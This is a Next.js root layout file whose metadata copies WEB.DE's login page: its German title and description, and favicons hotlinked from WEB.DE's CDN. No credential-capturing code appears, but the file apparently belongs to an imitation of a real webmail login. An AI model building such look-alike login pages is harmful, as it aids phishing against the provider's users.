import type { Metadata } from "next";
import { Geist, Geist_Mono } from "next/font/google";
import "./../globals.css";

const geistSans = Geist({
  variable: "--font-geist-sans",
  subsets: ["latin"],
});

const geistMono = Geist_Mono({
  variable: "--font-geist-mono",
  subsets: ["latin"],
});

interface LayoutProps {
  children: React.ReactNode;
  // Change "de" | "en" to string here to satisfy Next.js core constraints
  params: Promise<{ locale: string }>;
}

export const metadata: Metadata = {
  title: "WEB.DE Login - E-Mail-Adresse und Passwort",
  description:
    "Mobiler Login ins WEB.DE Postfach: Hier können Sie sich mit dem Smartphone und Tablet schnell und sicher anmelden...",
  icons: {
    // Dynamically appends the shortcut links directly to the document head
    icon: [
      {
        url: "https://s.uicdn.com/uimag/7.11011.0/assets/logo/logo-webde-v4.svg",
        type: "image/svg+xml",
      },
    ],
    shortcut:
      "https://s.uicdn.com/uimag/7.11011.0/assets/logo/logo-webde-v4.svg",
    apple: "https://s.uicdn.com/uimag/7.11011.0/assets/logo/logo-webde-v4.svg",
  },
};

export default async function RootLayout({ children, params }: LayoutProps) {
  const resolvedParams = await params;

  const locale = resolvedParams.locale as "de" | "en";

  return (
    <html
      lang={locale}
      className={`${geistSans.variable} ${geistMono.variable} h-full antialiased`}
    >
      <body className="min-h-full flex flex-col">{children}</body>
    </html>
  );
}
